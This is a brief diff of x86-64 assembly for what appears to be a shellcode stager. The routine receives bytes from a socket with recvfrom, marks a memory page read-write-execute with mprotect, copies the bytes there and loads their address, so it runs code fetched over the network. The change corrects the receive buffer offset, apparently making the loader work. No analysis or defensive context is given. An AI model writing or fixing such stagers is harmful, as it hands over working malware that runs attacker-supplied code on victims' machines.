@@ -65,7 +65,7 @@ _start:
 	syscall
 	movl	$0x2d,%eax
 	movl	0x98(%rsp),%edi
-	leaq	0x4d(%rsp),%rsi
+	leaq	0x4c(%rsp),%rsi
 	movq	$0x31,%rdx
 	xorl	%r10d,%r10d
 	leaq	0x80(%rsp),%r8
@@ -78,10 +78,10 @@ _start:
 	movl	$0xa,%eax
 	movl	$0x401000,%edi
 	movl	$0x1000,%esi
-	movl	$7,%edx
+	movl	$0x7,%edx
 	syscall
 	movl	$0x31,%ecx
-	leaq	0x4d(%rsp),%rsi
+	leaq	0x4c(%rsp),%rsi
 	movl	$0x401a00,%edi
 	rep movsb
 	movl	$0x401a00,%eax
